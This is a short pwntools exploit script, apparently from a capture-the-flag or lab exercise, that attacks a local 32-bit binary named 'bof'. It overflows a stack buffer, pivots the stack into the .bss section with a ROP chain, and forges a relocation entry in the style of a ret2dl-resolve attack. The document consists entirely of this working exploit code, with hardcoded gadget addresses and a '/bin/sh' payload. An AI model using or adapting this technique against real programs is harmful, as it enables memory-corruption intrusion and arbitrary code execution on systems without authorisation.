from pwn import *

sh = process("./bof")
pwn = ELF("./bof")
read = pwn.plt["read"]
write = pwn.plt["write"]
base_stage = pwn.bss() + 0x800
pop_ebp_ret = 0x080492db
ppp_ret = 0x080492d9
leave_ret = 0x08049105
payload1 = flat(['a'*(0x6c+4), read, ppp_ret, 0, base_stage, 0x100, pop_ebp_ret, base_stage, leave_ret])
sh.sendline(payload1)

cmd = "/bin/sh"
plt0 = 0x08049020
rel_plt = 0x08048364
write_got = pwn.got["write"]
index_offset = base_stage + 28 - rel_plt
fake_reloc = flat([write_got, 0x607])
payload2 = "aaaa"
payload2 += flat([plt0, index_offset, "aaaa", 1, base_stage+0x80, len(cmd)])
payload2 += fake_reloc
payload2 = payload2.ljust(0x80, 'a')
payload2 += cmd + '\x00'
payload2 = payload2.ljust(0x100, 'a')
sh.sendline(payload2)
sh.interactive()